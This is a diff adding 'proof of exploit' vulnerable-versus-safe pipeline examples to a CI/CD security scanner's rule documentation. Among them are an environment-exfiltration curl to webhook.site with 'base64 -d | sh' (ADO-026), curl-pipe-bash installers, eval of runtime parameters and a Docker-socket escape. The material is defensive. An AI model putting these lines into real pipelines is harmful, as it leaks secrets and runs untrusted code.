@@ -958,6 +958,35 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``AzureCLI@2`` resolves to whatever
+# Microsoft ships as version 2 at job-start time. A
+# Microsoft-pushed update silently changes the task body;
+# more importantly, custom Marketplace tasks at floating
+# major version are repointable by their publisher.
+steps:
+  - task: AzureCLI@2
+    inputs:
+      azureSubscription: prod-sub
+      scriptType: bash
+      scriptLocation: inlineScript
+      inlineScript: az deploy ...
+
+# Safe: pin to a specific patch version (``AzureCLI@2.245.0``)
+# or use ``AzureCLI@2.x`` only for first-party Microsoft
+# tasks where Marketplace publish controls are stronger.
+# Renovate's azure-pipelines updater bumps these.
+steps:
+  - task: AzureCLI@2.245.0
+    inputs:
+      azureSubscription: prod-sub
+      scriptType: bash
+      scriptLocation: inlineScript
+      inlineScript: az deploy ...
+```
+
 **Source:** [`ADO-001`](../providers/azure.md#ado-001) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-002 }
@@ -1015,6 +1044,29 @@ jobs:
 
 **Recommendation.** Store secrets in an Azure Key Vault or a Library variable group with the secret flag set; reference them via `$(SECRET_NAME)` at runtime. For cloud access prefer Azure workload identity federation.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in the
+# pipeline ``variables:`` block. The YAML is committed
+# to git, printed in build logs when the step echoes
+# its environment, and visible to anyone with repo read.
+variables:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+steps:
+  - script: aws s3 cp ./build s3://bucket/
+
+# Safe: store credentials in a variable group linked to
+# Azure Key Vault. The pipeline references the group;
+# the actual values stay in Key Vault, rotate there
+# without a pipeline-file change, and are masked in logs.
+variables:
+  - group: aws-deploy   # backed by Key Vault
+steps:
+  - script: aws s3 cp ./build s3://bucket/
+```
+
 **Source:** [`ADO-003`](../providers/azure.md#ado-003) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-004`: Deployment job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-004 }
@@ -1038,6 +1090,36 @@ jobs:
 **How this is detected.** Container images can be declared at `resources.containers[].image` or `job.container` (string or `{image:}`). Floating / untagged refs let the publisher swap the image contents.
 
 **Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag. Avoid `:latest` and untagged refs.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a container resource pinned to a mutable
+# tag. The publisher (or anyone with publish access)
+# repoints the tag on the next refresh; every pipeline
+# run pulls the swap silently.
+resources:
+  containers:
+    - container: build-env
+      image: myorg/build-env:latest
+jobs:
+  - job: build
+    container: build-env
+    steps:
+      - script: make build
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot's docker ecosystem bump the digest in PRs.
+resources:
+  containers:
+    - container: build-env
+      image: myorg/build-env@sha256:abc123...
+jobs:
+  - job: build
+    container: build-env
+    steps:
+      - script: make build
+```
 
 **Source:** [`ADO-005`](../providers/azure.md#ado-005) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -1075,6 +1157,30 @@ jobs:
 
 - Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a credential-shaped literal anywhere in
+# the pipeline body (job env, task input, inline script)
+# leaks the same way as ADO-003 — committed to git,
+# echoable in logs, and accessible to anyone with repo
+# read.
+steps:
+  - bash: |
+      curl -H "Authorization: Bearer ghp_abcdef1234567890abcdef1234567890abcdef12" \
+        https://api.github.com/repos/org/repo/issues
+
+# Safe: fetch from Key Vault via a variable group at
+# runtime. The pipeline body carries the env name, not
+# the value.
+variables:
+  - group: github-app   # GITHUB_TOKEN backed by Key Vault
+steps:
+  - bash: |
+      curl -H "Authorization: Bearer $(GITHUB_TOKEN)" \
+        https://api.github.com/repos/org/repo/issues
+```
+
 **Source:** [`ADO-008`](../providers/azure.md#ado-008) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-009`: Container image pinned by tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-ado-009 }
@@ -1095,6 +1201,41 @@ jobs:
 
 **Recommendation.** Add a verification step before consuming the artifact: `cosign verify-attestation`, `sha256sum -c`, or `gpg --verify` against a manifest the producing pipeline signed.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``download:`` pulls artifacts from another
+# pipeline in the same project. If that upstream pipeline
+# accepts PR-validated builds, the artifact may have been
+# built by attacker-controlled code; the consuming
+# pipeline runs it.
+resources:
+  pipelines:
+    - pipeline: build
+      source: vendor-build
+      trigger: true
+steps:
+  - download: build
+    artifact: release
+  - script: ./release/installer.sh
+
+# Safe: verify a producer-signed checksum or attestation
+# before executing anything from the downloaded artifact.
+# Restrict the upstream pipeline to non-PR builds if
+# verification isn't feasible.
+resources:
+  pipelines:
+    - pipeline: build
+      source: vendor-build
+      trigger: true
+steps:
+  - download: build
+    artifact: release
+  - script: |
+      sha256sum -c $(Pipeline.Workspace)/build/release/manifest.sha256
+  - script: ./release/installer.sh
+```
+
 **Source:** [`ADO-010`](../providers/azure.md#ado-010) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-011`: `template: <local-path>` on PR-validated pipeline <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-011 }
@@ -1104,6 +1245,36 @@ jobs:
 **How this is detected.** `template: <relative-path>` includes another YAML from the CURRENT repo. On PR validation builds, the repo content is the PR branch, letting the PR author swap the template body. Cross-repo templates (`template: foo.yml@my-repo`) are version-pinned and not affected.
 
 **Recommendation.** Move the template into a separate, branch-protected repository and reference it via `template: foo.yml@<repo-resource>` with a pinned `ref:` on the resource. That way the template content is fixed at PR creation time and can't be modified from the PR branch.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the pipeline includes a local template that
+# any PR can modify, on a PR-validated pipeline. An MR
+# can rewrite ``ci/build.yml`` and have its own version
+# of the build run with the pipeline's full credential
+# set in scope.
+trigger: [main]
+pr: [main]   # PR-validated
+steps:
+  - template: ci/build.yml   # local, editable per PR
+
+# Safe: split the PR-validated leg from any deploy /
+# release work. The PR-validation YAML inlines the build
+# (or templates from a separate, protected repo); the
+# deploy YAML runs only on the protected branch + with
+# environment approval.
+trigger: [main]
+pr: [main]
+resources:
+  repositories:
+    - repository: templates
+      type: git
+      name: myorg/ci-templates
+      ref: refs/tags/v1.4.2   # SHA-stable template ref
+steps:
+  - template: build.yml@templates
+```
 
 **Source:** [`ADO-011`](../providers/azure.md#ado-011) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -1169,6 +1340,27 @@ jobs:
 
 - Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` in a script step trusts
+# both the network path and the installer host. A MITM
+# or compromised endpoint ships malicious code into the
+# step shell with the job's full credential set.
+steps:
+  - bash: |
+      curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify a sha256 digest from a trusted
+# source, then execute.
+steps:
+  - bash: |
+      set -e
+      curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+      echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+      bash /tmp/cli.sh
+```
+
 **Source:** [`ADO-016`](../providers/azure.md#ado-016) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-017 }
@@ -1181,6 +1373,28 @@ jobs:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket gives the build container full kernel
+# access and the agent's runtime. A compromise escapes
+# to the agent and from there to every other build
+# sharing it.
+steps:
+  - script: |
+      docker run --privileged \
+        -v /var/run/docker.sock:/var/run/docker.sock \
+        myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. If
+# the build needs to build images, use Kaniko / BuildKit
+# rootless instead.
+steps:
+  - script: |
+      docker run myapp@sha256:abc123... ./integration.sh
+```
+
 **Source:** [`ADO-017`](../providers/azure.md#ado-017) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-018 }
@@ -1192,6 +1406,29 @@ jobs:
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP. ``--trusted-host`` silences hash
+# verification for the named host, so an attacker on the
+# network path can swap wheels in flight.
+steps:
+  - bash: |
+      pip install \
+        --index-url http://internal-pypi.example.com/simple \
+        --trusted-host internal-pypi.example.com \
+        -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed in the agent's trust store.
+steps:
+  - bash: |
+      pip install \
+        --index-url https://internal-pypi.example.com/simple \
+        --require-hashes -r requirements.txt
+```
 
 **Source:** [`ADO-018`](../providers/azure.md#ado-018) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -1292,6 +1529,27 @@ extends:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` disables
+# certificate verification for every subsequent npm call.
+# A network attacker MITMs the registry and ships
+# substituted tarballs that npm installs unverified.
+steps:
+  - bash: |
+      npm config set strict-ssl false
+      npm install
+
+# Safe: install the missing CA into the agent's trust
+# store and keep strict-ssl on.
+steps:
+  - bash: |
+      sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
+      sudo update-ca-certificates
+      npm install
+```
+
 **Source:** [`ADO-023`](../providers/azure.md#ado-023) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-024 }
@@ -1312,6 +1570,36 @@ extends:
 
 **Recommendation.** On every ``resources.repositories`` entry referenced from a ``template: ...@repo-alias`` directive, set ``ref: refs/tags/<sha>`` or the bare 40-char commit SHA, never a branch or floating tag. A moved branch/tag swaps the template body without changing your pipeline file.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ref: refs/heads/main`` on a cross-repo
+# template is mutable. Whoever can push to ``main`` on
+# ``ci-templates`` ships code into every consumer's
+# pipeline on the next run.
+resources:
+  repositories:
+    - repository: templates
+      type: git
+      name: myorg/ci-templates
+      ref: refs/heads/main
+steps:
+  - template: build.yml@templates
+
+# Safe: pin to a tag (immutable in Azure Repos when
+# branch policies enforce tag-protect) or a 40-char
+# commit SHA. Renovate's azure-pipelines updater bumps
+# these in reviewable PRs.
+resources:
+  repositories:
+    - repository: templates
+      type: git
+      name: myorg/ci-templates
+      ref: 0123456789abcdef0123456789abcdef01234567   # v1.4.2
+steps:
+  - template: build.yml@templates
+```
+
 **Source:** [`ADO-025`](../providers/azure.md#ado-025) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-026`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-026 }
@@ -1327,6 +1615,29 @@ extends:
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a
+# known miner binary. A malicious PR (or compromised
+# co-maintainer) lands the payload in the pipeline file
+# itself; every subsequent run executes it.
+steps:
+  - bash: |
+      echo Z2g6Li4uIA== | base64 -d | sh
+      curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# No obfuscated execution, no exfil POSTs, no
+# ``base64 -d | sh`` pipelines. If a check fires here
+# it's either a compromise or a CTF fixture; treat as
+# incident response.
+steps:
+  - checkout: self
+  - bash: make build
+```
+
 **Source:** [`ADO-026`](../providers/azure.md#ado-026) in the [Azure DevOps provider](../providers/azure.md).
 
 ### `ADO-027`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-027 }
@@ -1340,6 +1651,32 @@ extends:
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval "$BUILD_CMD"`` on a value that came
+# from a variable group / runtime parameter gives the
+# value full shell-grammar reach. ``sh -c $RAW`` on an
+# unquoted variable is the same shape.
+parameters:
+  - name: cmd
+    type: string
+steps:
+  - bash: |
+      eval "${{ parameters.cmd }}"
+
+# Safe: replace dynamic shell evaluation with an explicit
+# dispatcher over an allow-list, or invoke a script you
+# own that does its own validation. Never eval values
+# from runtime parameters.
+parameters:
+  - name: target
+    type: string
+    values: [staging, prod]
+steps:
+  - bash: ./scripts/deploy.sh "${{ parameters.target }}"
+```
 
 **Source:** [`ADO-027`](../providers/azure.md#ado-027) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -1360,6 +1697,45 @@ extends:
 **How this is detected.** Pairs with IAM-008 (the AWS-side OIDC rule). Azure's equivalent trust path runs through service connections that map to Azure AD federated identity credentials. The ADO-side gate is either a deployment + environment or a branch-pinned condition; this rule flags jobs that have neither.
 
 **Recommendation.** Every job that consumes an Azure service connection (via ``AzureCLI@``, ``AzurePowerShell@``, ``AzureKeyVault@``, ``AzureWebApp@``, etc.) must either be a ``deployment:`` job bound to an ``environment:`` (which carries approval checks and audit) or carry a ``condition:`` that pins ``Build.SourceBranch`` to a protected ref. Without one of those gates, any branch push drives the federated assume-role on Azure AD.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a service-connection-using job runs on any
+# branch (PR builds included) without an environment
+# gate. The OIDC role's trust policy accepts any token
+# from the pipeline, so a fork-PR build assumes prod
+# and does whatever the role permits.
+jobs:
+  - job: deploy
+    steps:
+      - task: AzureCLI@2.245.0
+        inputs:
+          azureSubscription: prod-sub   # OIDC service connection
+          scriptType: bash
+          scriptLocation: inlineScript
+          inlineScript: az deploy ...
+
+# Safe: gate the deploy on a protected environment and a
+# branch filter to ``main`` only. The OIDC token is
+# minted only after human approval and only on the
+# protected branch.
+trigger: [main]
+jobs:
+  - deployment: deploy
+    condition: eq(variables['Build.SourceBranch'], 'refs/heads/main')
+    environment: production   # requires reviewer approval
+    strategy:
+      runOnce:
+        deploy:
+          steps:
+            - task: AzureCLI@2.245.0
+              inputs:
+                azureSubscription: prod-sub
+                scriptType: bash
+                scriptLocation: inlineScript
+                inlineScript: az deploy ...
+```
 
 **Source:** [`ADO-029`](../providers/azure.md#ado-029) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -1426,6 +1802,38 @@ jobs:
 
 **Recommendation.** Pin every container / script template image to a content-addressable digest (``alpine@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the workflow's containers at the next pull, with no audit trail in the WorkflowTemplate.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``alpine:3.18`` is a mutable tag. The Alpine
+# maintainers (or a registry compromise / namespace hijack)
+# repoint the tag on the next 3.18.x point release; every
+# Workflow run after that pulls the new image without any
+# audit trail in the manifest.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata: { name: build }
+spec:
+  templates:
+    - name: build
+      container:
+        image: alpine:3.18
+        command: [./build.sh]
+
+# Safe: pin to the content-addressable digest. Renovate's
+# docker-tag ecosystem bumps the digest in reviewable PRs
+# so the pin doesn't drift behind security patches.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata: { name: build }
+spec:
+  templates:
+    - name: build
+      container:
+        image: alpine@sha256:abc123...
+        command: [./build.sh]
+```
+
 **Source:** [`ARGO-001`](../providers/argo.md#argo-001) in the [Argo Workflows provider](../providers/argo.md).
 
 ### `ARGO-002`: Argo template container runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-002 }
@@ -1435,6 +1843,43 @@ jobs:
 **How this is detected.** Detection fires on ``securityContext.privileged: true``, ``runAsUser: 0``, ``runAsNonRoot: false``, ``allowPrivilegeEscalation: true``, or no ``securityContext`` block at all. Also walks ``spec.podSpecPatch`` (raw YAML) for an explicit ``privileged: true`` token.
 
 **Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every template container / script. A privileged container shares the node's kernel namespaces; a malicious image then has root on the build node and breaks the boundary between workflow and cluster.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``privileged: true`` gives the container full
+# access to the node's devices and capabilities. A workload
+# compromise (poisoned image, build-script RCE) becomes a
+# node-level shell with access to every other pod scheduled
+# on the same node.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+spec:
+  templates:
+    - name: build
+      container:
+        image: builder@sha256:abc123...
+        securityContext:
+          privileged: true
+
+# Safe: explicit non-root with privilege-escalation off.
+# Drop all capabilities; add back only the ones the
+# workload genuinely needs (rare for build templates).
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+spec:
+  templates:
+    - name: build
+      container:
+        image: builder@sha256:abc123...
+        securityContext:
+          privileged: false
+          allowPrivilegeEscalation: false
+          runAsNonRoot: true
+          runAsUser: 10001
+          capabilities:
+            drop: ["ALL"]
+```
 
 **Source:** [`ARGO-002`](../providers/argo.md#argo-002) in the [Argo Workflows provider](../providers/argo.md).
 
@@ -1455,6 +1900,47 @@ jobs:
 **How this is detected.** Walks ``spec.volumes[].hostPath`` and the raw ``spec.podSpecPatch`` string for ``hostNetwork``, ``hostPID``, ``hostIPC``, and ``hostPath``.
 
 **Recommendation.** Use ``emptyDir`` or PVC-backed volumes instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` from any inline ``podSpecPatch``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the workflow break out of the pod and act as the underlying node.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``hostPath: /var/run/docker.sock`` mounts the
+# Docker socket into the template's container. The workflow
+# can then ``docker run --privileged -v /:/host ...`` and
+# own the entire node — kubelet credentials, every other
+# pod's filesystem, every secret mounted on the node.
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+spec:
+  volumes:
+    - name: docker-sock
+      hostPath:
+        path: /var/run/docker.sock
+  templates:
+    - name: build
+      container:
+        image: docker:latest
+        volumeMounts:
+          - { name: docker-sock, mountPath: /var/run/docker.sock }
+
+# Safe: use a sandboxed builder (Kaniko, BuildKit rootless)
+# in a PVC-backed workspace. The template never needs node-
+# level access to the container runtime, just a writable
+# scratch volume scoped to the workflow run.
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+spec:
+  volumes:
+    - name: scratch
+      emptyDir: {}
+  templates:
+    - name: build
+      container:
+        image: gcr.io/kaniko-project/executor:v1.21.0
+        args: [--context=git://..., --destination=registry/app:tag]
+        volumeMounts:
+          - { name: scratch, mountPath: /workspace }
+```
 
 **Source:** [`ARGO-004`](../providers/argo.md#argo-004) in the [Argo Workflows provider](../providers/argo.md).
 
@@ -1528,6 +2014,48 @@ spec:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in the
+# WorkflowTemplate manifest, committed to git and readable
+# by every namespace member with workflowtemplates: get on
+# it. ``argo logs`` echoes the value when the container
+# prints its environment; ``argo get -o yaml`` exposes it
+# directly.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+spec:
+  templates:
+    - name: upload
+      container:
+        image: aws-cli@sha256:abc123...
+        env:
+          - name: AWS_ACCESS_KEY_ID
+            value: AKIAIOSFODNN7EXAMPLE
+          - name: AWS_SECRET_ACCESS_KEY
+            value: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+# Safe: mount the secret via ``valueFrom.secretKeyRef``.
+# The actual value lives in a Kubernetes Secret resource;
+# the template references it by name, so the manifest
+# carries no secret material.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+spec:
+  templates:
+    - name: upload
+      container:
+        image: aws-cli@sha256:abc123...
+        env:
+          - name: AWS_ACCESS_KEY_ID
+            valueFrom:
+              secretKeyRef: { name: aws-uploader, key: access_key_id }
+          - name: AWS_SECRET_ACCESS_KEY
+            valueFrom:
+              secretKeyRef: { name: aws-uploader, key: secret_access_key }
+```
+
 **Source:** [`ARGO-006`](../providers/argo.md#argo-006) in the [Argo Workflows provider](../providers/argo.md).
 
 ### `ARGO-007`: Argo workflow has no activeDeadlineSeconds <span class="pg-sev pg-sev--low">LOW</span> { #detail-argo-007 }
@@ -1549,6 +2077,44 @@ spec:
 **Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the template image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the workflow runs.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` trusts both the network path
+# (any MITM substitutes the script) and the host (an
+# attacker-compromised installer endpoint silently serves
+# attacker code). The script runs as the workflow's pod,
+# inheriting every secret mounted into the container.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+spec:
+  templates:
+    - name: install-cli
+      script:
+        image: alpine@sha256:abc123...
+        command: [sh]
+        source: |
+          curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download to a file, verify a sha256 digest from a
+# trusted source, then execute. If the upstream content
+# changes the digest stops matching and the build fails
+# before the malicious code runs.
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+spec:
+  templates:
+    - name: install-cli
+      script:
+        image: alpine@sha256:abc123...
+        command: [sh]
+        source: |
+          set -e
+          curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+          echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+          bash /tmp/cli.sh
+```
 
 **Source:** [`ARGO-008`](../providers/argo.md#argo-008) in the [Argo Workflows provider](../providers/argo.md).
 
@@ -1640,6 +2206,44 @@ Other artifact sources are skipped, an OCI / S3 / GCS pull carries its own integ
 
 - Local-mirror development workflows occasionally use ``http://`` against an internal registry that's only reachable from a private network. The integrity guarantee still relies on network isolation rather than transport encryption; suppress on the specific template name when this is the deliberate shape.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``http://`` artifact URL means Argo fetches
+# the input over plaintext. Any on-path attacker (compromised
+# corporate proxy, malicious VPN, BGP hijack on the internal
+# mirror) substitutes the dataset; Argo executes whatever
+# bytes arrive. ``git://`` is the same shape — legacy
+# unauthenticated git with no integrity check.
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+spec:
+  templates:
+    - name: process
+      inputs:
+        artifacts:
+          - name: dataset
+            path: /input/dataset.tar.gz
+            http:
+              url: http://internal-mirror.example.com/datasets/v1.tar.gz
+
+# Safe: HTTPS for the fetch. For high-value artifacts, also
+# verify a producer-signed checksum after download (the
+# artifact source providing an integrity guarantee, e.g.
+# S3 + ETag or an OCI artifact + content digest).
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+spec:
+  templates:
+    - name: process
+      inputs:
+        artifacts:
+          - name: dataset
+            path: /input/dataset.tar.gz
+            http:
+              url: https://internal-mirror.example.com/datasets/v1.tar.gz
+```
+
 **Source:** [`ARGO-015`](../providers/argo.md#argo-015) in the [Argo Workflows provider](../providers/argo.md).
 
 ### `ATTEST-001`: SLSA provenance attests an untrusted builder identity <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-001 }
@@ -1661,6 +2265,43 @@ Triggering this rule means the bytes of the runtime image were produced by a bui
 
 - [SLSA threat-model v1.0](https://slsa.dev/spec/v1.0/threats): untrusted builder is the canonical Build-track Threat #2 ('Build the package from a modified source'). A tampered self-hosted runner can emit a syntactically-valid attestation for the wrong source.
 - [GitHub docs on self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security): non-ephemeral self-hosted runners default to persisted state between jobs; one compromised job gives the attacker arbitrary code execution that produces signed artifacts on every subsequent legitimate build on that runner. SLSA's isolation requirement (L2+) explicitly excludes this shape, which is why the rule treats ``self-hosted`` URIs as untrusted regardless of the rest of the chain.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the SLSA provenance attestation names a
+# self-hosted builder whose isolation cannot be audited
+# publicly. The signed attestation only attests that *this*
+# builder produced the artifact; it doesn't guarantee the
+# build environment was hermetic. A compromised self-hosted
+# runner produces signed provenance for malicious bytes.
+{
+  "_type": "https://in-toto.io/Statement/v0.1",
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": {
+      "id": "https://internal-jenkins.example.com/jobs/build"
+    },
+    "buildType": "https://example.com/build-script@v1"
+  }
+}
+
+# Safe: rebuild via a recognized hosted CI builder that
+# enforces hermetic isolation (slsa-github-generator on a
+# GitHub-hosted runner, the canonical SLSA L3 producer).
+# Downstream verifiers can validate the builder URI against
+# a public allowlist and trust the isolation guarantee.
+{
+  "_type": "https://in-toto.io/Statement/v0.1",
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": {
+      "id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.1.0"
+    },
+    "buildType": "https://github.com/slsa-framework/slsa-github-generator/container@v1"
+  }
+}
+```
 
 **Source:** [`ATTEST-001`](../providers/oci.md#attest-001) in the [OCI manifest provider](../providers/oci.md).
 
@@ -1690,6 +2331,45 @@ Fires when:
 
 - [SLSA v1.0 threat model](https://slsa.dev/spec/v1.0/threats) (Source-track threats): a builder pulling code from a fork or a different ref than the operator believes produces an attestation that signs the wrong bytes. The source-track threats catalog those source-substitution shapes that a pinned + verified source claim mitigates.
 - [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): the build system pulled tampered source from an unauthorized branch via SUNSPOT, producing 'authentic' signed builds for code the development team never wrote. A pinned, verified source-repo claim is the control SLSA L2+ requires specifically to detect this shape.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``configSource.uri`` is empty (or 'unknown' /
+# 'n/a' / a placeholder). The trusted builder produced and
+# signed an attestation but the source-repo claim is
+# missing, so a downstream verifier can confirm WHO built
+# but not WHAT they built. The attestation is structurally
+# valid yet semantically empty.
+{
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": { "id": "https://github.com/.../generator@v2.1.0" },
+    "invocation": {
+      "configSource": {
+        "uri": "",
+        "digest": {}
+      }
+    }
+  }
+}
+
+# Safe: concrete source-repo URI plus a commit-level
+# digest. Verifiers can now confirm the image was built
+# from the expected repository at the expected commit.
+{
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": { "id": "https://github.com/.../generator@v2.1.0" },
+    "invocation": {
+      "configSource": {
+        "uri": "git+https://github.com/myorg/myrepo@refs/tags/v1.4.2",
+        "digest": { "sha1": "0123456789abcdef0123456789abcdef01234567" }
+      }
+    }
+  }
+}
+```
 
 **Source:** [`ATTEST-002`](../providers/oci.md#attest-002) in the [OCI manifest provider](../providers/oci.md).
 
@@ -1947,6 +2627,33 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
